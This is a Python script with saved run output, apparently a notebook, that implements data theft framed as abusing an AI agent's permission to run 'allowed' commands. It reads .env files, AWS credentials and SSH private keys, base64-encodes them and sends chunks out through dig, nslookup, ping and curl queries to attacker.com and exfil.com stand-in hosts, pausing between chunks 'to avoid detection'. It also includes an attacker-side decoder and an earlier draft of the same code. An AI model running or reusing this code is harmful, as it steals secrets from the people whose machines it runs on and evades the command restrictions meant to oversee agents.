import subprocess
import time
import base64
import os
import sys
import json
from datetime import datetime

def exfiltrate_via_tool_output(log_to_file=True):
    """
    Uses AI agent's ability to run commands and see output,
    then exfiltrates via allowed commands
    
    Args:
        log_to_file: If True, saves logs to file; if False, prints to console
    """
    
    # Setup logging
    def log_message(msg, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        log_entry = f"[{timestamp}] [{level}] {msg}"
        
        if log_to_file:
            with open("exfiltration_log.txt", "a") as log_file:
                log_file.write(log_entry + "\n")
        else:
            print(log_entry)
    
    log_message("=" * 60)
    log_message("EXFILTRATION PROCESS STARTED")
    log_message("=" * 60)
    
    # Step 1: Read sensitive files
    log_message("STEP 1: Reading sensitive files")
    
    files_to_check = [
        ".env",
        "config.json",
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.ssh/id_rsa")
    ]
    
    collected_data = []
    
    for file_path in files_to_check:
        log_message(f"Checking file: {file_path}")
        
        # Check if file exists first
        if os.path.exists(file_path):
            log_message(f"File exists: {file_path}")
            try:
                # Use cat/grep to read files
                log_message(f"Executing: cat {file_path}")
                
                result = subprocess.run(
                    ["cat", file_path], 
                    capture_output=True, 
                    text=True,
                    timeout=2
                )
                
                if result.returncode == 0:
                    log_message(f"Successfully read {file_path}")
                    
                    # Log file size and preview (first 50 chars)
                    file_size = len(result.stdout)
                    preview = result.stdout[:50].replace('\n', '\\n')
                    log_message(f"File size: {file_size} bytes")
                    log_message(f"Preview: {preview}...")
                    
                    # Log stderr if any
                    if result.stderr:
                        log_message(f"stderr: {result.stderr}", "WARNING")
                    
                    collected_data.append(f"{file_path}:\n{result.stdout}")
                else:
                    log_message(f"Failed to read {file_path}: Return code {result.returncode}", "ERROR")
                    
            except subprocess.TimeoutExpired:
                log_message(f"Timeout reading {file_path}", "ERROR")
            except Exception as e:
                log_message(f"Error reading {file_path}: {str(e)}", "ERROR")
        else:
            log_message(f"File does not exist: {file_path}", "WARNING")
    
    log_message(f"Collected data from {len(collected_data)} files")
    
    # Step 2: Encode collected data
    log_message("\nSTEP 2: Encoding collected data")
    
    if not collected_data:
        log_message("No data collected, aborting exfiltration", "ERROR")
        return
    
    all_data = "\n---\n".join(collected_data)
    log_message(f"Combined data size: {len(all_data)} bytes")
    
    try:
        encoded = base64.b64encode(all_data.encode()).decode()
        log_message(f"Base64 encoded size: {len(encoded)} bytes")
        log_message(f"Encoded preview: {encoded[:50]}...")
    except Exception as e:
        log_message(f"Encoding failed: {str(e)}", "ERROR")
        return
    
    # Step 3: Exfiltrate via "allowed" command
    log_message("\nSTEP 3: Exfiltrating via DNS")
    
    chunks = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
    log_message(f"Split into {len(chunks)} chunks")
    
    for i, chunk in enumerate(chunks):
        log_message(f"\nProcessing chunk {i+1}/{len(chunks)}")
        log_message(f"Chunk size: {len(chunk)} bytes")
        
        # Create domain with chunk data
        domain = f"chunk{i}.{chunk}.exfil.attacker.com"
        log_message(f"Target domain: {domain}")
        
        try:
            # Exfiltrate via dig (often allowed for DNS)
            log_message(f"Executing: dig {domain} TXT")
            
            result = subprocess.run(
                ["dig", domain, "TXT"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Log command results
            log_message(f"dig return code: {result.returncode}")
            
            if result.stdout:
                stdout_preview = result.stdout[:100].replace('\n', '\\n')
                log_message(f"stdout preview: {stdout_preview}...")
            
            if result.stderr:
                log_message(f"stderr: {result.stderr}", "WARNING")
            
            # Check if dig command was successful (even if domain doesn't exist)
            if result.returncode == 0 or "NXDOMAIN" in result.stdout:
                log_message(f"Chunk {i+1} exfiltrated successfully (DNS query sent)")
            else:
                log_message(f"dig command failed", "ERROR")
                
        except subprocess.TimeoutExpired:
            log_message(f"Timeout on chunk {i+1}", "ERROR")
        except Exception as e:
            log_message(f"Error exfiltrating chunk {i+1}: {str(e)}", "ERROR")
        
        # Small delay to avoid detection
        log_message(f"Sleeping 0.1 seconds before next chunk")
        time.sleep(0.1)
    
    log_message("\n" + "=" * 60)
    log_message("EXFILTRATION PROCESS COMPLETED")
    log_message(f"Total data exfiltrated: {len(all_data)} bytes")
    log_message("=" * 60)
    
    return {
        "files_read": len(collected_data),
        "total_bytes": len(all_data),
        "encoded_bytes": len(encoded),
        "chunks": len(chunks),
        "timestamp": datetime.now().isoformat()
    }

def simulate_attacker_reception(log_file="exfiltration_log.txt"):
    """
    Simulate what an attacker would see when receiving the exfiltrated data
    """
    print("\n" + "=" * 60)
    print("ATTACKER'S PERSPECTIVE - DNS Server Logs")
    print("=" * 60)
    
    # Read the log file to reconstruct what was sent
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            logs = f.read()
        
        # Extract all DNS queries from the log
        import re
        dns_queries = re.findall(r'chunk\d+\.[A-Za-z0-9+/=]+\.exfil\.attacker\.com', logs)
        
        if dns_queries:
            print(f"\nCaptured {len(dns_queries)} DNS queries:")
            
            # Reconstruct the encoded data
            encoded_parts = []
            for query in dns_queries:
                # Extract the base64 part
                match = re.search(r'chunk\d+\.([A-Za-z0-9+/=]+)\.exfil', query)
                if match:
                    encoded_parts.append(match.group(1))
                    print(f"  DNS Query: {query}")
            
            # Reconstruct and decode
            if encoded_parts:
                encoded_data = ''.join(encoded_parts)
                print(f"\nReconstructed encoded data: {encoded_data[:50]}...")
                
                try:
                    # Add padding if needed
                    padding_needed = 4 - (len(encoded_data) % 4)
                    if padding_needed < 4:
                        encoded_data += '=' * padding_needed
                    
                    decoded = base64.b64decode(encoded_data).decode('utf-8')
                    print(f"\n" + "=" * 60)
                    print("DECODED EXFILTRATED DATA:")
                    print("=" * 60)
                    print(decoded)
                    print("=" * 60)
                    print(f"Total bytes recovered: {len(decoded)}")
                    
                except Exception as e:
                    print(f"Error decoding: {e}")
    
    else:
        print("No log file found")

def exfiltrate_with_fallbacks():
    """
    Attempt exfiltration using multiple methods with logging
    """
    
    def log(msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    
    log("Starting multi-method exfiltration")
    
    # Read sensitive data
    sensitive_data = []
    
    # Try different methods to gather data
    gathering_methods = [
        ("env variables", lambda: os.environ.get("API_KEY", "")),
        ("current dir files", lambda: subprocess.run(["ls", "-la"], capture_output=True, text=True).stdout),
        ("process list", lambda: subprocess.run(["ps", "aux"], capture_output=True, text=True).stdout),
        ("network config", lambda: subprocess.run(["ifconfig"], capture_output=True, text=True).stdout),
    ]
    
    for method_name, method_func in gathering_methods:
        log(f"Attempting to gather: {method_name}")
        try:
            result = method_func()
            if result:
                sensitive_data.append(f"=== {method_name} ===\n{result}")
                log(f"Successfully gathered {method_name} ({len(result)} bytes)")
        except Exception as e:
            log(f"Failed to gather {method_name}: {e}")
    
    combined = "\n".join(sensitive_data)
    log(f"Total data collected: {len(combined)} bytes")
    
    # Try multiple exfiltration methods
    exfil_methods = [
        ("dig", lambda data: subprocess.run(["dig", f"data.{base64.b64encode(data[:50].encode()).decode()}.exfil.com", "TXT"])),
        ("nslookup", lambda data: subprocess.run(["nslookup", f"data.{base64.b64encode(data[:50].encode()).decode()}.exfil.com"])),
        ("ping", lambda data: subprocess.run(["ping", "-c", "1", f"data.{base64.b64encode(data[:50].encode()).decode()}.exfil.com"])),
        ("curl", lambda data: subprocess.run(["curl", "-s", f"http://exfil.com/{base64.b64encode(data[:50].encode()).decode()}"])),
    ]
    
    for method_name, method_func in exfil_methods:
        log(f"Attempting exfiltration via: {method_name}")
        try:
            # Exfiltrate in chunks
            encoded = base64.b64encode(combined.encode()).decode()
            chunks = [encoded[i:i+50] for i in range(0, min(len(encoded), 200), 50)]
            
            for i, chunk in enumerate(chunks):
                log(f"  Exfiltrating chunk {i+1}/{len(chunks)} via {method_name}")
                result = method_func(chunk)
                log(f"  {method_name} return code: {result.returncode}")
                time.sleep(0.5)
                
            log(f"Successfully exfiltrated via {method_name}")
            break
        except Exception as e:
            log(f"Failed exfiltration via {method_name}: {e}")
    
    log(f"Exfiltration complete. Would exfiltrate {len(combined)} bytes")

# Example usage
if __name__ == "__main__":
    # Clear previous log
    if os.path.exists("exfiltration_log.txt"):
        os.remove("exfiltration_log.txt")
    
    print("Running exfiltration simulation with detailed logging...")
    print("-" * 60)
    
    # Run the exfiltration
    result = exfiltrate_via_tool_output(log_to_file=True)
    
    if result:
        print("\nExfiltration Summary:")
        print(f"  Files read: {result['files_read']}")
        print(f"  Total bytes: {result['total_bytes']}")
        print(f"  Would exfiltrate {result['total_bytes']} bytes")
    
    # Show attacker's perspective
    simulate_attacker_reception()
    
    # Try multi-method approach
    print("\n" + "=" * 60)
    print("Attempting multi-method exfiltration")
    print("=" * 60)
    exfiltrate_with_fallbacks()

"""
Running exfiltration simulation with detailed logging...
------------------------------------------------------------

============================================================
ATTACKER'S PERSPECTIVE - DNS Server Logs
============================================================

============================================================
Attempting multi-method exfiltration
============================================================
[04:48:08] Starting multi-method exfiltration
[04:48:08] Attempting to gather: env variables
[04:48:08] Attempting to gather: current dir files
[04:48:08] Successfully gathered current dir files (454 bytes)
[04:48:08] Attempting to gather: process list
[04:48:08] Successfully gathered process list (2939 bytes)
[04:48:08] Attempting to gather: network config
[04:48:08] Successfully gathered network config (809 bytes)
[04:48:08] Total data collected: 4274 bytes
[04:48:08] Attempting exfiltration via: dig
[04:48:08]   Exfiltrating chunk 1/4 via dig
[04:48:08]   dig return code: 10
[04:48:08]   Exfiltrating chunk 2/4 via dig
[04:48:08]   dig return code: 10
[04:48:09]   Exfiltrating chunk 3/4 via dig
[04:48:09]   dig return code: 10
[04:48:09]   Exfiltrating chunk 4/4 via dig
[04:48:09]   dig return code: 10
[04:48:10] Successfully exfiltrated via dig
[04:48:10] Exfiltration complete. Would exfiltrate 4274 bytes

!cat exfiltration_log.txt

[2026-03-12 04:48:08.061] [INFO] ============================================================
[2026-03-12 04:48:08.061] [INFO] EXFILTRATION PROCESS STARTED
[2026-03-12 04:48:08.061] [INFO] ============================================================
[2026-03-12 04:48:08.061] [INFO] STEP 1: Reading sensitive files
[2026-03-12 04:48:08.061] [INFO] Checking file: .env
[2026-03-12 04:48:08.061] [WARNING] File does not exist: .env
[2026-03-12 04:48:08.062] [INFO] Checking file: config.json
[2026-03-12 04:48:08.062] [WARNING] File does not exist: config.json
[2026-03-12 04:48:08.062] [INFO] Checking file: /root/.aws/credentials
[2026-03-12 04:48:08.062] [WARNING] File does not exist: /root/.aws/credentials
[2026-03-12 04:48:08.062] [INFO] Checking file: /root/.ssh/id_rsa
[2026-03-12 04:48:08.062] [WARNING] File does not exist: /root/.ssh/id_rsa
[2026-03-12 04:48:08.062] [INFO] Collected data from 0 files
[2026-03-12 04:48:08.062] [INFO] 
STEP 2: Encoding collected data
[2026-03-12 04:48:08.062] [ERROR] No data collected, aborting exfiltration

"""    


"""
import subprocess
import time
import requests

def exfiltrate_via_tool_output():
    """
    Uses AI agent's ability to run commands and see output,
    then exfiltrates via allowed commands
    """
    
    # Step 1: Read sensitive files
    files_to_check = [
        ".env",
        "config.json",
        "~/.aws/credentials",
        "~/.ssh/id_rsa"
    ]
    
    collected_data = []
    
    for file_path in files_to_check:
        try:
            # Use cat/grep to read files
            result = subprocess.run(
                ["cat", file_path], 
                capture_output=True, 
                text=True,
                timeout=2
            )
            if result.stdout:
                collected_data.append(f"{file_path}:\n{result.stdout}")
        except:
            pass
    
    # Step 2: Encode collected data
    all_data = "\n---\n".join(collected_data)
    encoded = base64.b64encode(all_data.encode()).decode()
    
    # Step 3: Exfiltrate via "allowed" command (curl/wget/dig)
    chunks = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
    
    for i, chunk in enumerate(chunks):
        # Exfiltrate via dig (often allowed for DNS)
        subprocess.run([
            "dig", f"chunk{i}.{chunk}.exfil.attacker.com", "TXT"
        ], capture_output=True)
        
        # Small delay to avoid detection
        time.sleep(0.1)
"""